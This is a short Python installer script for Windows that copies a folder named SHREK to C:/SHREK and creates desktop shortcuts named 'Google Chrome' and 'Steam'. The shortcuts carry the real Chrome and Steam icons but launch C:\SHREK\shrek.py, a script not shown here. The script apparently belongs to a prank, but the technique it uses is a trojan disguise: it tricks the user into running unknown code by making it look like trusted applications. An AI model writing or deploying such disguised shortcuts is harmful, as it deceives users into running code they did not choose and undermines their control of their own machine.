import os, winshell
from win32com.client import Dispatch
import shutil
import time
import subprocess
desktop = "%UserProfile%\\Desktop"

res = subprocess.run('py -m pip install -r D:\\Shrekked\\requirements.txt', capture_output=True)
print(res.stdout)

src = "SHREK"

dest = "C:/SHREK"

destination = shutil.copytree(src, dest) 

time.sleep(1)

path = os.path.join(desktop, "Google Chrome.lnk")
target = "C:\\SHREK\\shrek.py"
wDir = "C:\\SHREK"
icon = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()

path = os.path.join(desktop, "Steam.lnk")
target = "C:\\SHREK\\shrek.py"
wDir = "C:\\SHREK"
icon = "C:\\Program Files (x86)\\Steam\\steam.exe"
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()